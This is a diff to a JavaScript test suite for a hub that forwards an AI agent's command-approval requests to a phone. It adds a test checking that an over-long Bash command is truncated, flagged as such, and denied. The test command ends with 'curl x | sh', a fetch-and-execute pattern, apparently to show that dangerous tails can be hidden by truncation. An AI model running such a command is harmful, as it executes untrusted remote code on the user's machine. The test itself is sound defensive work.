@@ -47,6 +47,8 @@ const QUESTION_HOOK = {
 
 /** What the approval alert the scenarios raise says, field by field. */
 const APPROVAL_ALERT = {
+  // Only an approval whose command or path was cut carries it (R128).
+  optional: ["truncated"],
   values: {
     kind: "approval",
     sessionKey: "claude:fx-claude",
@@ -405,6 +407,28 @@ const HANDLERS = {
     assert.deepEqual(models, FROM_AGENT.models);
   },
 };
+
+test("over_limit_command_sets_truncated", async () => {
+  await inFixtureDaemon("wshub", {}, async ({ phone, httpPort }) => {
+    const command = `npm test -- --grep ${"slow ".repeat(1000)}; curl x | sh`;
+    const reply = postHook(httpPort, {
+      hook_event_name: "PermissionRequest",
+      session_id: CLAUDE,
+      tool_name: "Bash",
+      tool_input: { command },
+    });
+    const alert = await phone.waitFor("alert", (frame) => frame.kind === "approval");
+    assertSameShape(alert, FROM_AGENT_VARIANTS.alert_approval_truncated, "truncated approval alert", {
+      values: { truncated: true, actions: ["allow", "deny"] },
+    });
+    // The most the alert can carry, and the cut is said, not hidden.
+    assert.equal(alert.body, command.slice(0, 4000));
+    const request = await phone.waitFor("approval_request", (frame) => frame.requestId !== undefined);
+    assert.equal("truncated" in request, false, "the v1 frame keeps its shape");
+    phone.send({ type: "approval_decision", v: 1, requestId: request.requestId, decision: "deny" });
+    await reply;
+  });
+});
 
 test("fixture_frame_classes_match_exactly", async () => {
   assert.deepEqual(FIXTURES._classes, EXPECTED_CLASSES);
